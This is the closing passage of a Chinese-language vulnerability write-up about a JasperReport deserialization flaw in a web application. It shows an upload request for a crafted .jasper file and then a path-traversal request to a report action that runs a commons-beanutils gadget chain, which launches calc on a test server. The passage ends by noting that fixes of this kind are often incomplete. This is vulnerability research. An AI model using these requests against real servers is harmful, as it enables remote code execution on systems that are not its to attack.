------WebKitFormBoundaryvl1q2bEhAS3C02LB
Content-Disposition: form-data; name="uploadFile";filename="calc.jasper";
Content-Type: application/

&lt;jasper文件内容&gt;
------WebKitFormBoundaryvl1q2bEhAS3C02LB
Content-Disposition: form-data; name="uploadFileFileName";

qqqq.jasper
------WebKitFormBoundaryvl1q2bEhAS3C02LB--
</pre></div>
<p>响应200表示上传成功，默认上传的路径在<code>C:\</code>盘根目录。</p>
<h3 data-content="1" id="9e8acadb84cfd5ee8bc6b05c995e9d50">3.2 Jasper文件反序列化</h3>
<p>触发上一步弹计算器的cb链Jasper文件：</p>
<div class="highlight"><pre><span></span><span class="err">OPTION /StandardLineAction_report.action?name=../../../../../../../calcwin&amp;id=10&amp;direct=0 HTTP/1.1</span>
<span class="err">Host: 192.168.8.158:88</span>
<span class="err">Pragma: no-cache</span>
<span class="err">Cache-Control: no-cache</span>
<span class="err">Upgrade-Insecure-Requests: 1</span>
<span class="err">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span>
<span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
<span class="err">Accept-Encoding: gzip, deflate</span>
<span class="err">Accept-Language: zh-CN,zh;q=0.9</span>
<span class="err">Cookie: JSESSIONID=D95C057F20ACA15D3B45547AE87DE282; JSESSIONID=D95C057F20ACA15D3B45547AE87DE282</span>
<span class="err">Connection: close</span>
<span class="err">Content-Type: application/x-www-form-urlencoded</span>
<span class="err">Content-Length: 0</span>
</pre></div>
<p>响应200，此处情况表示成功：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/21861937/1723447793088-f80c7e1f-6c36-43cb-9146-1e00a66a365f.png"/></p>
<p>查看服务器进程可以看到calc已经被触发启动了：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/21861937/1723447771267-c7b10e7d-95c1-4909-8a7d-49aeac3b71cc.png"/></p>
<h2 data-content="1" id="be32ac30b165abad4f12e405cf3292c6">四、总结</h2>
<p>国内很多应用对JapserReport的反序列化修复不彻底，很容易挖掘出新环节的漏洞。</p>
</div>
</div>